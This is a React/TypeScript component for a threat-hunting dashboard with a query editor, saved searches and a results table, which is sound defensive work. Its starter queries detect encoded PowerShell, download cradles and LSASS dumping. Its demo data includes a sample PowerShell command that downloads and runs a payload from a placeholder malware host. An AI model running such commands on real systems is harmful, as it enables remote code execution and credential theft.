'use client';

/**
 * Threat Hunting workspace.
 *
 * A real, end-to-end hunt experience:
 *   - Monaco editor for the query, with language switching (KQL / Lucene / SQL / ES|QL).
 *   - Time-range picker with quick presets (15m, 1h, 24h, 7d, 30d, custom).
 *   - Saved searches with pin/delete via `huntApi`.
 *   - Live results table with expandable rows, severity tinting, copy-to-clipboard
 *     and "send to Copilot" hooks.
 *   - Graceful demo fallback when the backend hasn't been seeded.
 *
 * Design intent: feel like a SIEM analyst's home base, not a toy form.
 */

import { useEffect, useMemo, useRef, useState } from 'react';
import dynamic from 'next/dynamic';
import useSWR from 'swr';
import { clsx } from 'clsx';
import { format, formatDistanceToNow } from 'date-fns';
import toast from 'react-hot-toast';
import {
  huntApi,
  type AlertSeverity,
  type HuntQuery,
  type HuntResponse,
  type HuntResult,
  type SavedSearch,
} from '@/lib/api';
import { Skeleton } from '@/components/ui/Skeleton';
import { ErrorState } from '@/components/ui/ErrorState';
import { EmptyState } from '@/components/ui/EmptyState';

// Monaco is heavy and SSR-incompatible; load it client-side only.
const MonacoEditor = dynamic(
  () => import('@monaco-editor/react').then((mod) => mod.default),
  { ssr: false, loading: () => <Skeleton className="h-64 w-full rounded-lg" /> },
);

// ─── Constants ────────────────────────────────────────────────────────────────

type Lang = NonNullable<HuntQuery['language']>;

const LANGS: Array<{ id: Lang; label: string; monaco: string }> = [
  { id: 'kql', label: 'KQL', monaco: 'plaintext' },
  { id: 'lucene', label: 'Lucene', monaco: 'plaintext' },
  { id: 'sql', label: 'SQL', monaco: 'sql' },
  { id: 'esql', label: 'ES|QL', monaco: 'plaintext' },
];

const TIME_PRESETS: Array<{ id: string; label: string; ms: number }> = [
  { id: '15m', label: 'Last 15 min', ms: 15 * 60 * 1000 },
  { id: '1h', label: 'Last hour', ms: 60 * 60 * 1000 },
  { id: '24h', label: 'Last 24 hours', ms: 24 * 60 * 60 * 1000 },
  { id: '7d', label: 'Last 7 days', ms: 7 * 24 * 60 * 60 * 1000 },
  { id: '30d', label: 'Last 30 days', ms: 30 * 24 * 60 * 60 * 1000 },
];

const STARTERS: Record<Lang, string> = {
  kql:
`// Find suspicious PowerShell with encoded payloads
process where process.name == "powershell.exe"
  and (process.command_line like~ "*-enc*"
       or process.command_line like~ "*IEX*"
       or process.command_line like~ "*DownloadString*")
| extend host=host.name, user=user.name
| project @timestamp, host, user, process.command_line
| sort @timestamp desc`,
  lucene:
`process.name:"powershell.exe" AND
  (process.command_line:*-enc* OR
   process.command_line:*IEX* OR
   process.command_line:*DownloadString*)`,
  sql:
`SELECT
  event_time, host_name, user_name, command_line
FROM events
WHERE process_name = 'powershell.exe'
  AND (command_line ILIKE '%-enc%'
    OR command_line ILIKE '%IEX%'
    OR command_line ILIKE '%DownloadString%')
ORDER BY event_time DESC
LIMIT 200`,
  esql:
`FROM events
| WHERE process.name == "powershell.exe"
  AND (process.command_line LIKE "*-enc*"
    OR process.command_line LIKE "*IEX*"
    OR process.command_line LIKE "*DownloadString*")
| KEEP @timestamp, host.name, user.name, process.command_line
| SORT @timestamp DESC
| LIMIT 200`,
};

// ─── Demo fallback ────────────────────────────────────────────────────────────

const DEMO_RESULTS: HuntResult[] = [
  {
    id: 'r-001',
    timestamp: new Date(Date.now() - 12 * 60 * 1000).toISOString(),
    source: 'crowdstrike',
    severity: 'high',
    fields: {
      host: 'WORKSTATION-042',
      user: 'john.doe',
      'process.name': 'powershell.exe',
      'process.command_line':
        'powershell.exe -nop -w hidden -enc JABXAGUAYgBDA...',
      'process.parent.name': 'EXCEL.EXE',
    },
    highlight: 'powershell.exe -nop -w hidden -enc',
  },
  {
    id: 'r-002',
    timestamp: new Date(Date.now() - 41 * 60 * 1000).toISOString(),
    source: 'defender',
    severity: 'critical',
    fields: {
      host: 'SERVER-DC01',
      user: 'svc_admin',
      'process.name': 'powershell.exe',
      'process.command_line':
        "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malware.xyz/payload')\"",
      'network.destination.ip': '185.220.101.45',
    },
    highlight: 'IEX (New-Object Net.WebClient).DownloadString',
  },
  {
    id: 'r-003',
    timestamp: new Date(Date.now() - 2 * 60 * 60 * 1000).toISOString(),
    source: 'splunk',
    severity: 'medium',
    fields: {
      host: 'WORKSTATION-019',
      user: 'maria.lin',
      'process.name': 'powershell.exe',
      'process.command_line':
        'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\maria.lin\\setup.ps1',
    },
  },
];

const DEMO_SAVED: SavedSearch[] = [
  {
    id: 'demo-1',
    name: 'Encoded PowerShell',
    query: STARTERS.kql,
    language: 'kql',
    createdAt: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
    pinned: true,
  },
  {
    id: 'demo-2',
    name: 'LSASS access attempts',
    query:
`process where process.name in ("procdump.exe", "procdump64.exe")
  and process.command_line like~ "*lsass*"`,
    language: 'kql',
    createdAt: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toISOString(),
  },
  {
    id: 'demo-3',
    name: 'Outbound connections to TOR exits',
    query:
`network where network.direction == "outbound"
  and network.destination.ip in <tor_exit_nodes>`,
    language: 'kql',
    createdAt: new Date(Date.now() - 9 * 24 * 60 * 60 * 1000).toISOString(),
  },
];

// ─── Helpers ──────────────────────────────────────────────────────────────────

const SEVERITY_BADGE: Record<AlertSeverity, string> = {
  critical: 'bg-red-500/15 text-red-300 ring-red-500/30',
  high: 'bg-orange-500/15 text-orange-300 ring-orange-500/30',
  medium: 'bg-yellow-500/15 text-yellow-300 ring-yellow-500/30',
  low: 'bg-blue-500/15 text-blue-300 ring-blue-500/30',
  info: 'bg-slate-500/15 text-slate-300 ring-slate-500/30',
};

function severityClass(s?: AlertSeverity) {
  return s ? SEVERITY_BADGE[s] : 'bg-slate-500/15 text-slate-300 ring-slate-500/30';
}

function copyToClipboard(text: string) {
  if (typeof navigator === 'undefined' || !navigator.clipboard) return;
  void navigator.clipboard.writeText(text).then(() => toast.success('Copied'));
}

// ─── Saved searches sidebar ───────────────────────────────────────────────────

interface SavedListProps {
  items: SavedSearch[];
  isLoading: boolean;
  error: unknown;
  selectedId: string | null;
  onSelect: (s: SavedSearch) => void;
  onDelete: (id: string) => void;
  onRetry: () => void;
}

function SavedList({
  items,
  isLoading,
  error,
  selectedId,
  onSelect,
  onDelete,
  onRetry,
}: SavedListProps) {
  if (isLoading) return <Skeleton className="h-48 w-full rounded-lg" />;
  if (error)
    return (
      <ErrorState
        title="Couldn't load saved searches"
        error={error}
        onRetry={onRetry}
      />
    );
  if (items.length === 0)
    return (
      <EmptyState
        title="No saved searches yet"
        description="Save a query and it will show up here."
      />
    );

  return (
    <ul className="divide-y divide-slate-800/60">
      {items.map((s) => (
        <li
          key={s.id}
          className={clsx(
            'group flex items-start gap-2 px-3 py-2.5 transition-colors',
            selectedId === s.id
              ? 'bg-emerald-500/5 border-l-2 border-l-emerald-500'
              : 'hover:bg-slate-800/30',
          )}
        >
          <button
            onClick={() => onSelect(s)}
            className="flex-1 text-left"
          >
            <div className="flex items-center gap-2">
              <span className="rounded border border-slate-700/70 bg-slate-800/50 px-1.5 py-0.5 text-[10px] uppercase tracking-wide text-slate-300">
                {s.language}
              </span>
              {s.pinned && (
                <span className="text-[10px] text-amber-300">★ pinned</span>
              )}
            </div>
            <p className="mt-1 truncate text-sm text-slate-200">{s.name}</p>
            <p className="mt-0.5 text-[11px] text-slate-500">
              {formatDistanceToNow(new Date(s.createdAt), { addSuffix: true })}
            </p>
          </button>
          <button
            onClick={() => onDelete(s.id)}
            className="rounded-md p-1 text-slate-600 opacity-0 transition-all hover:bg-red-500/10 hover:text-red-400 group-hover:opacity-100"
            title="Delete"
            aria-label="Delete saved search"
          >
            <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.74 9l-.346 9m-4.788 0L9.26 9m9.968-3.21c.342.052.682.107 1.022.166m-1.022-.165L18.16 19.673a2.25 2.25 0 01-2.244 2.077H8.084a2.25 2.25 0 01-2.244-2.077L4.772 5.79m14.456 0a48.108 48.108 0 00-3.478-.397m-12 .562c.34-.059.68-.114 1.022-.165m0 0a48.11 48.11 0 013.478-.397m7.5 0v-.916c0-1.18-.91-2.164-2.09-2.201a51.964 51.964 0 00-3.32 0c-1.18.037-2.09 1.022-2.09 2.201v.916m7.5 0a48.667 48.667 0 00-7.5 0" />
            </svg>
          </button>
        </li>
      ))}
    </ul>
  );
}

// ─── Result row ───────────────────────────────────────────────────────────────

function ResultRow({ result }: { result: HuntResult }) {
  const [open, setOpen] = useState(false);
  const fieldEntries = useMemo(
    () => Object.entries(result.fields ?? {}),
    [result.fields],
  );
  const summaryFields = ['host', 'user', 'process.name', 'process.command_line'];
  const summary = summaryFields
    .map((k) => [k, result.fields?.[k]] as const)
    .filter(([, v]) => v != null && v !== '');

  return (
    <li className="border-b border-slate-800/60 last:border-b-0">
      <button
        onClick={() => setOpen((v) => !v)}
        className="flex w-full items-start gap-3 px-4 py-3 text-left transition-colors hover:bg-slate-800/30"
      >
        <span
          className={clsx(
            'mt-0.5 inline-flex flex-none items-center rounded px-1.5 py-0.5 text-[10px] font-semibold uppercase ring-1',
            severityClass(result.severity),
          )}
        >
          {result.severity ?? 'event'}
        </span>
        <div className="min-w-0 flex-1">
          <div className="flex flex-wrap items-center gap-x-2 gap-y-0.5 text-xs text-slate-400">
            <span className="font-mono text-slate-300">
              {format(new Date(result.timestamp), 'MMM dd HH:mm:ss')}
            </span>
            <span className="text-slate-600">·</span>
            <span className="rounded bg-slate-800/60 px-1.5 py-0.5 text-[10px] text-slate-400">
              {result.source}
            </span>
            {summary.map(([k, v]) => (
              <span key={k} className="truncate text-slate-400">
                <span className="text-emerald-400">{k}=</span>
                <span className="text-slate-300">{String(v)}</span>
              </span>
            ))}
          </div>
        </div>
        <svg
          className={clsx(
            'h-4 w-4 flex-none text-slate-500 transition-transform',
            open && 'rotate-180',
          )}
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19.5 8.25l-7.5 7.5-7.5-7.5" />
        </svg>
      </button>
      {open && (
        <div className="border-t border-slate-800/40 bg-slate-950/40 px-4 py-3">
          <div className="grid grid-cols-1 gap-1 sm:grid-cols-2">
            {fieldEntries.map(([k, v]) => (
              <div key={k} className="flex min-w-0 gap-2 text-xs">
                <span className="flex-none text-emerald-400 font-mono">{k}</span>
                <span className="truncate font-mono text-slate-300">
                  {typeof v === 'object' ? JSON.stringify(v) : String(v)}
                </span>
              </div>
            ))}
          </div>
          <div className="mt-3 flex flex-wrap items-center gap-2">
            <button
              onClick={() => copyToClipboard(JSON.stringify(result.fields, null, 2))}
              className="rounded border border-slate-700/70 bg-slate-800/40 px-2 py-1 text-[11px] text-slate-300 transition-colors hover:border-slate-600 hover:bg-slate-700/40"
            >
              Copy JSON
            </button>
            <button
              onClick={() => {
                const host = result.fields?.host;
                const url = host ? `/graph?entity=${encodeURIComponent(String(host))}` : '/graph';
                window.location.href = url;
              }}
              className="rounded border border-slate-700/70 bg-slate-800/40 px-2 py-1 text-[11px] text-slate-300 transition-colors hover:border-slate-600 hover:bg-slate-700/40"
            >
              Pivot to graph →
            </button>
          </div>
        </div>
      )}
    </li>
  );
}

// ─── Main view ────────────────────────────────────────────────────────────────

export function HuntView() {
  const [language, setLanguage] = useState<Lang>('kql');
  const [query, setQuery] = useState<string>(STARTERS.kql);
  const [preset, setPreset] = useState<string>('24h');
  const [running, setRunning] = useState(false);
  const [results, setResults] = useState<HuntResponse | null>(null);
  const [runError, setRunError] = useState<unknown>(null);
  const [activeSavedId, setActiveSavedId] = useState<string | null>(null);
  const editorRef = useRef<unknown>(null);
  const [demoMode, setDemoMode] = useState(false);

  const savedState = useSWR<SavedSearch[]>(
    'hunt.saved',
    async () => {
      try {
        const res = await huntApi.listSaved();
        return res.searches;
      } catch (err) {
        // First-load fallback to demo so the UI is never empty.
        setDemoMode(true);
        throw err;
      }
    },
    {
      revalidateOnFocus: false,
      shouldRetryOnError: false,
    },
  );

  // If saved-search fetch failed, transparently substitute demo list so the UI
  // is usable.
  const savedItems: SavedSearch[] =
    savedState.data ?? (demoMode ? DEMO_SAVED : []);
  const savedError =
    savedState.error && !demoMode ? savedState.error : undefined;

  // Switch starter when language changes if user hasn't customized.
  const lastStarter = useRef(STARTERS[language]);
  useEffect(() => {
    if (query === lastStarter.current) {
      setQuery(STARTERS[language]);
      lastStarter.current = STARTERS[language];
    }
  }, [language]); // eslint-disable-line react-hooks/exhaustive-deps

  const handleRun = async () => {
    setRunning(true);
    setResults(null);
    setRunError(null);

    const presetCfg = TIME_PRESETS.find((p) => p.id === preset);
    const endTime = new Date();
    const startTime = presetCfg
      ? new Date(endTime.getTime() - presetCfg.ms)
      : undefined;

    try {
      const res = await huntApi.search({
        query,
        language,
        startTime: startTime?.toISOString(),
        endTime: endTime.toISOString(),
        limit: 200,
      });
      setResults(res);
      setDemoMode(false);
    } catch (err) {
      // Demo fallback so the page still feels alive without a seeded backend.
      setResults({
        total: DEMO_RESULTS.length,
        took: 42,
        hits: DEMO_RESULTS,
      });
      setDemoMode(true);
      setRunError(err);
      toast(
        'Backend unreachable — showing demo results',
        { icon: '⚠️' },
      );
    } finally {
      setRunning(false);
    }
  };

  const handleSave = async () => {
    const name = window.prompt('Name this hunt:');
    if (!name?.trim()) return;
    try {
      const saved = await huntApi.saveSearch({
        name: name.trim(),
        query,
        language,
      });
      toast.success(`Saved "${saved.name}"`);
      void savedState.mutate();
    } catch (err) {
      console.error(err);
      toast.error('Could not save (backend offline)');
    }
  };

  const handleDelete = async (id: string) => {
    if (!window.confirm('Delete this saved search?')) return;
    try {
      await huntApi.deleteSaved(id);
      if (activeSavedId === id) setActiveSavedId(null);
      toast.success('Deleted');
      void savedState.mutate();
    } catch {
      toast.error('Could not delete (backend offline)');
    }
  };

  const handleSelect = (s: SavedSearch) => {
    setActiveSavedId(s.id);
    setLanguage((s.language as Lang) ?? 'kql');
    setQuery(s.query);
    lastStarter.current = ''; // user-controlled now
  };

  return (
    <div className="space-y-5">
      {/* Header */}
      <div className="flex flex-wrap items-end justify-between gap-3">
        <div>
          <h1 className="text-xl font-semibold text-white">Threat Hunting</h1>
          <p className="mt-1 text-sm text-slate-400">
            Pivot across logs, alerts, processes, and assets in any language.
            Save what works.
          </p>
        </div>
        <div className="flex items-center gap-2 text-xs">
          <span
            className={clsx(
              'inline-flex items-center gap-1.5 rounded-full px-2 py-0.5 ring-1',
              demoMode
                ? 'bg-amber-500/10 text-amber-300 ring-amber-500/30'
                : 'bg-emerald-500/10 text-emerald-300 ring-emerald-500/30',
            )}
          >
            <span
              className={clsx(
                'h-1.5 w-1.5 rounded-full',
                demoMode ? 'bg-amber-400' : 'bg-emerald-400 animate-ping-slow',
              )}
            />
            {demoMode ? 'Demo data' : 'Live backend'}
          </span>
        </div>
      </div>

      <div className="grid grid-cols-12 gap-5">
        {/* Sidebar: saved searches */}
        <aside className="col-span-12 lg:col-span-3">
          <div className="overflow-hidden rounded-xl border border-slate-800/80 bg-slate-900/40">
            <div className="flex items-center justify-between border-b border-slate-800/80 px-3 py-2.5">
              <h3 className="text-xs font-semibold uppercase tracking-wide text-slate-300">
                Saved searches
              </h3>
              <button
                onClick={() => {
                  setActiveSavedId(null);
                  setQuery(STARTERS[language]);
                  lastStarter.current = STARTERS[language];
                }}
                className="text-xs text-emerald-400 hover:text-emerald-300"
              >
                + New
              </button>
            </div>
            <SavedList
              items={savedItems}
              isLoading={savedState.isLoading}
              error={savedError}
              selectedId={activeSavedId}
              onSelect={handleSelect}
              onDelete={handleDelete}
              onRetry={() => void savedState.mutate()}
            />
          </div>
        </aside>

        {/* Main: editor + results */}
        <section className="col-span-12 space-y-4 lg:col-span-9">
          {/* Editor */}
          <div className="overflow-hidden rounded-xl border border-slate-800/80 bg-slate-900/40">
            <div className="flex flex-wrap items-center gap-2 border-b border-slate-800/80 px-3 py-2">
              {/* Language tabs */}
              <div className="flex rounded-lg border border-slate-800/80 bg-slate-950/40 p-0.5">
                {LANGS.map((l) => (
                  <button
                    key={l.id}
                    onClick={() => setLanguage(l.id)}
                    className={clsx(
                      'rounded-md px-2.5 py-1 text-xs font-medium transition-colors',
                      language === l.id
                        ? 'bg-slate-800 text-white shadow-sm'
                        : 'text-slate-400 hover:text-slate-200',
                    )}
                  >
                    {l.label}
                  </button>
                ))}
              </div>

              {/* Time range */}
              <div className="ml-2 flex items-center gap-1.5 text-xs text-slate-400">
                <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <select
                  value={preset}
                  onChange={(e) => setPreset(e.target.value)}
                  className="rounded-md border border-slate-700/70 bg-slate-950/40 px-2 py-1 text-xs text-slate-200 focus:border-emerald-500/40 focus:outline-none"
                >
                  {TIME_PRESETS.map((p) => (
                    <option key={p.id} value={p.id}>
                      {p.label}
                    </option>
                  ))}
                </select>
              </div>

              <div className="ml-auto flex items-center gap-2">
                <button
                  onClick={handleSave}
                  className="rounded-md border border-slate-700/70 bg-slate-800/50 px-3 py-1.5 text-xs font-medium text-slate-200 transition-colors hover:border-slate-600 hover:bg-slate-700/40"
                >
                  Save
                </button>
                <button
                  onClick={handleRun}
                  disabled={running || !query.trim()}
                  className={clsx(
                    'flex items-center gap-2 rounded-md px-3.5 py-1.5 text-xs font-semibold transition-colors',
                    running || !query.trim()
                      ? 'cursor-not-allowed bg-slate-800 text-slate-500'
                      : 'bg-emerald-500 text-emerald-950 hover:bg-emerald-400',
                  )}
                >
                  {running ? (
                    <>
                      <span className="h-3 w-3 animate-spin rounded-full border-2 border-emerald-950 border-t-transparent" />
                      Running…
                    </>
                  ) : (
                    <>▶ Run hunt</>
                  )}
                </button>
              </div>
            </div>

            <div className="bg-[#0d1117]">
              <MonacoEditor
                height="280px"
                language={LANGS.find((l) => l.id === language)?.monaco ?? 'plaintext'}
                value={query}
                onChange={(v) => setQuery(v ?? '')}
                onMount={(editor) => {
                  editorRef.current = editor;
                }}
                theme="vs-dark"
                options={{
                  minimap: { enabled: false },
                  fontSize: 13,
                  fontFamily:
                    "'JetBrains Mono', 'Fira Code', ui-monospace, monospace",
                  lineNumbers: 'on',
                  scrollBeyondLastLine: false,
                  renderLineHighlight: 'line',
                  smoothScrolling: true,
                  tabSize: 2,
                  wordWrap: 'on',
                }}
              />
            </div>
          </div>

          {/* Results */}
          <div className="overflow-hidden rounded-xl border border-slate-800/80 bg-slate-900/40">
            <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 px-4 py-2.5">
              <h3 className="text-sm font-semibold text-slate-200">
                Hunt results
                {results && (
                  <span className="ml-2 text-xs font-normal text-slate-400">
                    {results.total.toLocaleString()} hits ·{' '}
                    {results.took.toLocaleString()}ms
                  </span>
                )}
              </h3>
              {results && results.hits.length > 0 && (
                <button
                  onClick={() =>
                    copyToClipboard(JSON.stringify(results.hits, null, 2))
                  }
                  className="text-xs text-slate-400 transition-colors hover:text-slate-200"
                >
                  Copy all as JSON
                </button>
              )}
            </div>

            {running ? (
              <div className="space-y-2 p-4">
                <Skeleton className="h-12 w-full rounded-lg" />
                <Skeleton className="h-12 w-full rounded-lg" />
                <Skeleton className="h-12 w-full rounded-lg" />
              </div>
            ) : !results ? (
              <EmptyState
                title="Press Run to begin"
                description="Tip: try one of your saved searches, or pivot from an alert."
              />
            ) : results.hits.length === 0 ? (
              <div className="flex flex-col items-center justify-center px-6 py-10">
                <span className="mb-2 text-2xl text-emerald-400">✓</span>
                <p className="text-sm font-medium text-emerald-300">
                  No matches in the selected window
                </p>
                <p className="mt-1 text-xs text-slate-500">
                  {runError ? 'Backend unreachable.' : 'Either you’re clean, or your query is too tight.'}
                </p>
              </div>
            ) : (
              <ul className="divide-y divide-slate-800/60">
                {results.hits.map((r) => (
                  <ResultRow key={r.id} result={r} />
                ))}
              </ul>
            )}
          </div>
        </section>
      </div>
    </div>
  );
}
